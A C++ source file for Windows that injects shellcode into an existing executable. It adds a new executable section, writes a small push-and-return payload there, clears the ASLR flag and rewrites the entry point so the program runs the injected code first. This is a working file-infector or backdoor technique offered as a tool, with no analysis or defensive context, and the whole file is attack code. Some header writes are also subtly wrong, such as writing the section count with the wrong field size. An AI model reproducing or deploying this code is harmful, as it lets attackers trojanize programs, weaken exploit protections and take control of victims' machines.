#include <iostream>
#include <fstream>
#include <Windows.h>

constexpr BYTE shellcode[] = {
    0x68, 0xA0, 0x99, 0x44, 0x00, 0xC3
};

void printErrorMessage(const std::string& message) {
    std::cerr << message << std::endl;
}

bool readAndInjectShellcode(const wchar_t* filePath) {
    HANDLE fileHandle = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        printErrorMessage("Failed to open file");
        return false;
    }

    DWORD fileSize = GetFileSize(fileHandle, nullptr);
    if (fileSize == INVALID_FILE_SIZE) {
        printErrorMessage("Failed to get file size");
        CloseHandle(fileHandle);
        return false;
    }

    BYTE* fileBuffer = new (std::nothrow) BYTE[fileSize];
    if (fileBuffer == nullptr) {
        printErrorMessage("Failed to allocate memory");
        CloseHandle(fileHandle);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(fileHandle, fileBuffer, fileSize, &bytesRead, nullptr)) {
        printErrorMessage("Failed to read file");
        delete[] fileBuffer;
        CloseHandle(fileHandle);
        return false;
    }
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)(fileBuffer);
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	DWORD ret = SetFilePointer(fileHandle, dosHeader->e_lfanew, NULL, FILE_BEGIN);
	DWORD newCharacteristics;
	DWORD offsetToDllCharacteristics = dosHeader->e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);

	if (ret != INVALID_SET_FILE_POINTER) {

		// Get the address of the last section
		IMAGE_SECTION_HEADER lastSection = sectionHeader[ntHeader->FileHeader.NumberOfSections - 1];

		// Get the size of the code and RVA of the new section
		DWORD fileAlignment = ntHeader->OptionalHeader.FileAlignment;
		DWORD sectionAlignment = ntHeader->OptionalHeader.SectionAlignment;
		DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
		DWORD newSectionVirtualAddress = lastSection.VirtualAddress + (lastSection.Misc.VirtualSize + (sectionAlignment - 1) & ~(sectionAlignment - 1));
		size_t codeSize = sizeof(shellcode);

		// Create new section
		IMAGE_SECTION_HEADER newSection = {};
		auto isize = sizeof(newSection.Name);
		strncpy_s(reinterpret_cast<char*>(newSection.Name), isize, ".abc", sizeof(".abc"));
		newSection.Misc.VirtualSize = codeSize; // Total size of the section when loaded into the memory
		newSection.SizeOfRawData = (codeSize + (fileAlignment - 1) & ~(fileAlignment - 1)); // Size of the section's initialized data on disk
		newSection.PointerToRawData = lastSection.PointerToRawData + lastSection.SizeOfRawData;
		newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
		newSection.VirtualAddress = newSectionVirtualAddress;

		// Add new section information to section header
		SetFilePointer(fileHandle, dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ntHeader->FileHeader.NumberOfSections * 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSection, sizeof(newSection), NULL, NULL);

		// Update the number of section existed within the file
		ntHeader->FileHeader.NumberOfSections++;
		SetFilePointer(fileHandle, dosHeader->e_lfanew + 6, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &ntHeader->FileHeader.NumberOfSections, sizeof(DWORD), NULL, NULL);

		// Inject the shellcode
		SetFilePointer(fileHandle, newSection.PointerToRawData, NULL, FILE_BEGIN);
		WriteFile(fileHandle, shellcode, codeSize, NULL, NULL);

		// Turn off DLL can move flag
		SetFilePointer(fileHandle, offsetToDllCharacteristics, NULL, FILE_BEGIN);
		BOOL readDllCharacteristics = ReadFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);
		if (!readDllCharacteristics) {
			printErrorMessage("Failed to read DllCharacteristics");
			CloseHandle(fileHandle);
			delete[] fileBuffer;
			return 1;
		}
		newCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

		// Write the modified DllCharacteristics field back to the file
		SetFilePointer(fileHandle, -static_cast<LONG>(sizeof(newCharacteristics)), NULL, FILE_CURRENT);
		WriteFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);

		// Recalculate the SizeOfImage and roundit up with SectionAlignment
		sizeOfImage = sizeOfImage + codeSize + (sectionAlignment - 1) & ~(sectionAlignment - 1);
		SetFilePointer(fileHandle, dosHeader->e_lfanew + 80, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &sizeOfImage, sizeof(DWORD), NULL, NULL);
		SetFilePointer(fileHandle, newSection.PointerToRawData + newSection.SizeOfRawData, NULL, FILE_BEGIN);
		SetEndOfFile(fileHandle);

		// Adjust the AddressOfEntryPoint to point to the new section
		ntHeader->OptionalHeader.AddressOfEntryPoint = newSectionVirtualAddress;
		SetFilePointer(fileHandle, dosHeader->e_lfanew + 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSectionVirtualAddress, sizeof(DWORD), NULL, NULL);

	}
	else {
		printErrorMessage("Failed to read PE Header");
	}

    delete[] fileBuffer;
    CloseHandle(fileHandle);
    return true;
}

int main() {
    const wchar_t* filePath = L"C:\\Users\\Avenger\\Desktop\\DXCpl - Copy.exe";

    if (readAndInjectShellcode(filePath)) {
        std::cout << "Shellcode injected successfully" << std::endl;
        return 0;
    }
    else {
        return 1;
    }
}
